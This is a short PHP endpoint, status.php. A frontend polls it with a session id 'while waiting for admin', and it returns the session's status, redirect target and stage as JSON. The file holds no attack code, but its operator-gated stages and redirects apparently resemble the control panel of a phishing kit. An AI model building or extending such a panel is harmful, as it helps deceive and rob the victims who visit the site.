<?php
// ───────────────────────────────────────────────────────────
// status.php – Polled by the frontend while waiting for admin
// GET param:  sid
// Returns JSON: { ok, status: "waiting"|"done", redirect: "..." }
// ───────────────────────────────────────────────────────────

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');
require_once "state.php";

$sid = $_GET['sid'] ?? ($_POST['sid'] ?? '');

if ($sid === '') {
  echo json_encode(['ok' => false, 'message' => 'missing sid']);
  exit;
}

$state = sess_load($sid);
if (!$state) {
  echo json_encode(['ok' => false, 'status' => 'unknown']);
  exit;
}

echo json_encode([
  'ok'       => true,
  'status'   => $state['status']   ?? 'waiting',
  'redirect' => $state['redirect'] ?? null,
  'stage'    => $state['stage']    ?? null,
]);
